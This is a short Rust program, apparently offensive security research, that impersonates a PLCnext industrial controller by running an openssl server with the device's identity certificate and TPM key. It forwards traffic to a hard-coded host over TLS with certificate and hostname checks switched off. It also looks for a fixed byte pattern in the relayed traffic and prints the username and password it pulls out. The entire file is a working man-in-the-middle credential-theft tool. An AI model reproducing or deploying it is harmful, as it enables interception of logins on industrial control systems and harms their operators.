use std::{process::Stdio, io};

use tokio::{net::TcpStream, io::{split, AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt}, process::Command};
use tokio_native_tls::TlsConnector;

#[tokio::main]
async fn main() -> io::Result<()> {
    println!("Hello, world!");

    
        let mut child = Command::new("openssl")
            .arg("s_server")
            .arg("-cert").arg("/media/rfs/ro/etc/plcnext/Security/IdentityStores/IDevID/certificate.pem")
            .arg("-accept").arg("41199")
            .arg("-keyform").arg("engine")
            .arg("-engine").arg("tpm")
            .arg("-key").arg("/media/rfs/ro/etc/plcnext/Security/IdentityStores/IDevID/tpmkey.pem")
            .arg("-cert_chain").arg("dev_crt_chain_modified.pem")
            .arg("-quiet")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("Failed to launch openSSL server");

        let mut stdin = child.stdin.take().unwrap();
        let mut stdout = BufReader::new(child.stdout.take().unwrap());


        loop {
            stdout.fill_buf().await?; //Hopefully this will wait until we get data

            let connector: TlsConnector = TlsConnector::from(
                native_tls::TlsConnector::builder()
                    .danger_accept_invalid_certs(true)
                    .danger_accept_invalid_hostnames(true)
                    .build()
                    .unwrap(),
            );

            let stream_out = TcpStream::connect("192.168.121.98:41100")
                .await
                .unwrap();
                
            let mut tls_stream = connector
                .connect("test.com", stream_out)
                .await
                .unwrap();

            let search_bytes = [0x04, 0x40, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x00, 0x0d, 0x00, 0xe9, 0xbf, 0x13];
            let mut buf = [0; 2048];

            loop {  
                //let found = current == search_bytes.len();
                tokio::select! {
                    Ok(n) = stdout.read(&mut buf) => {
                        if let Err(_) = tls_stream.write(&buf[..n]).await {break}
               
                        if &buf[0..17] == search_bytes {
                            //println!("{:02x?}", &buf[19..n-3]);
                            let t = &buf[19..n-3].split(|h| *h == 0).map(|arr| String::from_utf8_lossy(arr)).collect::<Vec<_>>();
                            println!("Username and Password collected:\nUsername: {}\nPassword: {}", t.first().unwrap(), t.last().unwrap());
                        }
                    }
                    Ok(b) = tls_stream.read_u8() => {
                        if let Err(_) = stdin.write(&[b]).await {break}
                    }
                }
            }

            println!("Session ended");
    }
}